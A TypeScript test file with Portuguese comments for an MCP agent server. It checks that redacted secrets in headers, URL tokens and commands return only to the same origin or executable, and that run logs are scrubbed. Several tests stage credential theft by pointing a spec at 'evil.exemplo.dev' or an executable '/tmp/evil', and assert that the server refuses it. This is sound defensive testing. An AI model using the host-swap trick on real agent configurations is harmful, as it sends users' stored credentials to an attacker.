import { before, test } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { db, schema } from "../src/db/index.js";
import { migrateDb } from "../src/db/migrate.js";
import { buildMcpServer } from "../src/mcp-server/server.js";
import { restoreSpec } from "../src/mcp-server/redact.js";
import { agentService } from "../src/services/agent-service.js";
import { mcpService } from "../src/services/mcp-service.js";
import { secretService } from "../src/services/secret-service.js";

/**
 * O valor oculto só volta para o mesmo destino: o segredo é do endereço ou do
 * programa a que foi cadastrado, e não do nome da chave. As leituras que nunca
 * voltam numa escrita passam pela heurística de segredo.
 */

before(() => migrateDb());

async function ligarCliente(): Promise<Client> {
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await buildMcpServer().connect(serverTransport);
  const client = new Client({ name: "teste", version: "0.0.0" });
  await client.connect(clientTransport);
  return client;
}

type Resposta = Awaited<ReturnType<Client["callTool"]>>;
const texto = (res: Resposta): string => (res.content as { type: string; text: string }[])[0]?.text ?? "";
function ok<T = unknown>(res: Resposta): T {
  assert.equal(res.isError, undefined, `ferramenta devolveu erro: ${texto(res)}`);
  return JSON.parse(texto(res)) as T;
}
const id = (base: string): string => `${base}-${randomUUID().slice(0, 8)}`;
const LITERAL = `literal-${randomUUID().slice(0, 8)}`;

const specHttp = (agentId: string, url: string, headers: Record<string, string>) => ({
  id: agentId,
  name: "Destino",
  steps: [
    { type: "model", key: "ler", name: "Ler", model: "anthropic/modelo", prompt: "x" },
    { type: "action", key: "p", name: "P", action: "http.request", needs: ["ler"], mode: "approve", params: { method: "POST", url, headers } },
  ],
});

async function paramsGravados(agentId: string): Promise<{ url: string; headers: Record<string, string> }> {
  const v = await agentService.getLatestVersion(agentId);
  return (v!.spec.steps.find((p) => p.key === "p") as unknown as { params: { url: string; headers: Record<string, string> } }).params;
}

test("register_mcp_server recusa o comando oculto quando o executável mudou", async () => {
  const client = await ligarCliente();
  const nome = id("srv");
  const command = ["npx", "pkg", "--api-key", "abc123opaco"];
  ok(await client.callTool({ name: "register_mcp_server", arguments: { name: nome, transport: "stdio", command } }));

  const res = await client.callTool({ name: "register_mcp_server", arguments: { name: nome, transport: "stdio", command: ["/tmp/evil", "pkg", "--api-key", "<oculto>"] } });
  assert.equal(res.isError, true);
  assert.ok(!texto(res).includes("abc123opaco"));
  assert.deepEqual((await mcpService.get(nome))!.config.command, command);
});

test("register_mcp_server com endereço novo não leva o header oculto junto", async () => {
  const client = await ligarCliente();
  const nome = id("http");
  ok(await client.callTool({ name: "register_mcp_server", arguments: { name: nome, transport: "http", url: "https://a.exemplo.dev/mcp", headers: { "X-Chave": LITERAL } } }));
  ok(await client.callTool({ name: "register_mcp_server", arguments: { name: nome, transport: "http", url: "https://evil.exemplo.dev/mcp", headers: { "X-Chave": "<oculto>" } } }));
  assert.equal((await mcpService.get(nome))!.config.headers?.["X-Chave"], undefined);
});

test("save_agent_edited: o header oculto não vai para outra origem", async () => {
  const client = await ligarCliente();
  const agentId = id("dest");
  await agentService.upsert(specHttp(agentId, "https://api.ok.exemplo.dev/x", { "X-Chave": LITERAL }) as never, undefined, "human");

  const res = ok<{ hiddenWithoutValue?: string[] }>(
    await client.callTool({ name: "save_agent_edited", arguments: { agentId, spec: specHttp(agentId, "https://evil.exemplo.dev/x", { "X-Chave": "<oculto>" }), note: "troca" } }),
  );
  assert.deepEqual(res.hiddenWithoutValue, ["p.headers.X-Chave"]);
  assert.deepEqual((await paramsGravados(agentId)).headers, {});
});

test("save_agent_edited: na mesma origem, com outro caminho, o header oculto volta", async () => {
  const client = await ligarCliente();
  const agentId = id("mesma");
  await agentService.upsert(specHttp(agentId, "https://api.ok.exemplo.dev/x", { "X-Chave": LITERAL }) as never, undefined, "human");
  ok(await client.callTool({ name: "save_agent_edited", arguments: { agentId, spec: specHttp(agentId, "https://api.ok.exemplo.dev/outro", { "X-Chave": "<oculto>" }), note: "caminho" } }));
  assert.equal((await paramsGravados(agentId)).headers["X-Chave"], LITERAL);
});

test("restoreSpec: mcp.call que troca de server não herda o oculto", () => {
  const passo = (server: string, headers: Record<string, string>) => ({ steps: [{ key: "c", params: { server, tool: "t", args: {}, headers } }] });
  const trocado = restoreSpec(passo("bom", { "X-Chave": LITERAL }), passo("outro", { "X-Chave": "<oculto>" }));
  assert.deepEqual(trocado.semValor, ["c.headers.X-Chave"]);
  const mesmo = restoreSpec(passo("bom", { "X-Chave": LITERAL }), passo("bom", { "X-Chave": "<oculto>" }));
  assert.deepEqual(mesmo.semValor, []);
  assert.equal((mesmo.spec.steps[0] as { params: { headers: Record<string, string> } }).params.headers["X-Chave"], LITERAL);
});

test("url de passo http com token na query sai oculta, volta na mesma origem e recusa em outra", async () => {
  const client = await ligarCliente();
  const agentId = id("url");
  const url = "https://api.ok.exemplo.dev/x?token=opaco12345&page=2";
  await agentService.upsert(specHttp(agentId, url, {}) as never, undefined, "human");

  const lida = await client.callTool({ name: "get_agent", arguments: { agentId } });
  assert.ok(!texto(lida).includes("opaco12345"));
  const spec = ok<{ spec: ReturnType<typeof specHttp> }>(lida).spec;
  assert.equal((spec.steps[1] as { params: { url: string } }).params.url, "https://api.ok.exemplo.dev/x?token=<oculto>&page=2");

  ok(await client.callTool({ name: "save_agent_edited", arguments: { agentId, spec: { ...spec, name: "Renomeado" }, note: "renomeia" } }));
  assert.equal((await paramsGravados(agentId)).url, url);

  const outra = { ...spec, steps: [spec.steps[0], { ...spec.steps[1], params: { method: "POST", url: "https://evil.exemplo.dev/x?token=<oculto>" } }] };
  const res = await client.callTool({ name: "save_agent_edited", arguments: { agentId, spec: outra, note: "troca" } });
  assert.equal(res.isError, true);
  assert.equal((await paramsGravados(agentId)).url, url);
});

test("texto livre com <oculto> na escrita é recusado", async () => {
  const client = await ligarCliente();
  const agentId = id("livre");
  await agentService.upsert(specHttp(agentId, "https://api.ok.exemplo.dev/x", {}) as never, undefined, "human");
  const spec = specHttp(agentId, "https://api.ok.exemplo.dev/x", {});
  (spec.steps[0] as { prompt: string }).prompt = "use <oculto> aqui";
  const res = await client.callTool({ name: "save_agent_edited", arguments: { agentId, spec, note: "n" } });
  assert.equal(res.isError, true);
  assert.match(texto(res), /oculto/);
});

test("get_run: erro e saída de passo saem sem segredo colado", async () => {
  const client = await ligarCliente();
  const agentId = id("run");
  const versao = await agentService.upsert(specHttp(agentId, "https://api.ok.exemplo.dev/x", {}) as never, undefined, "human");
  const run = id("run");
  await db.insert(schema.runs).values({ id: run, agentVersionId: versao.id, status: "failed", error: "falhou em https://x.exemplo.dev/a?token=erro-opaco-1" });
  await db.insert(schema.steps).values({ id: id("passo"), runId: run, idx: 1, stepKey: "p", name: "P", status: "failed", error: "senha: erro-opaco-2", output: { corpo: "https://x.exemplo.dev/b?api_key=saida-opaca" } });

  const detalhe = texto(await client.callTool({ name: "get_run", arguments: { runId: run } }));
  const lista = texto(await client.callTool({ name: "list_runs", arguments: {} }));
  for (const saida of [detalhe, lista]) {
    assert.ok(!saida.includes("erro-opaco-1"));
  }
  assert.ok(!detalhe.includes("erro-opaco-2"));
  assert.ok(!detalhe.includes("saida-opaca"));
});

test("o token do cofre guardado com Bearer sai oculto também sem o prefixo", async () => {
  secretService.useBackend({ available: () => true, encrypt: (p) => Buffer.from(p), decrypt: (b) => b.toString() });
  const client = await ligarCliente();
  const ref = `teste/${id("bearer")}`;
  const token = `tok-${randomUUID()}`;
  secretService.set(ref, `Bearer ${token}`);
  try {
    const agentId = id("bearer");
    await agentService.upsert({ id: agentId, name: "B", steps: [{ type: "model", key: "ler", name: "Ler", model: "anthropic/modelo", prompt: `o token ${token} aqui` }] } as never, undefined, "human");
    assert.ok(!texto(await client.callTool({ name: "get_agent", arguments: { agentId } })).includes(token));
  } finally {
    secretService.remove(ref);
  }
});

test("com segredo no cofre e sem keychain, a leitura falha fechada", async () => {
  secretService.useBackend({ available: () => true, encrypt: (p) => Buffer.from(p), decrypt: (b) => b.toString() });
  const ref = `teste/${id("fechada")}`;
  secretService.set(ref, `valor-${randomUUID()}`);
  try {
    secretService.useBackend({ available: () => false, encrypt: () => Buffer.alloc(0), decrypt: () => "" });
    const client = await ligarCliente();
    const res = await client.callTool({ name: "list_agents", arguments: {} });
    assert.equal(res.isError, true);
    assert.match(texto(res), /keychain/);
  } finally {
    secretService.useBackend({ available: () => true, encrypt: (p) => Buffer.from(p), decrypt: (b) => b.toString() });
    secretService.remove(ref);
  }
});
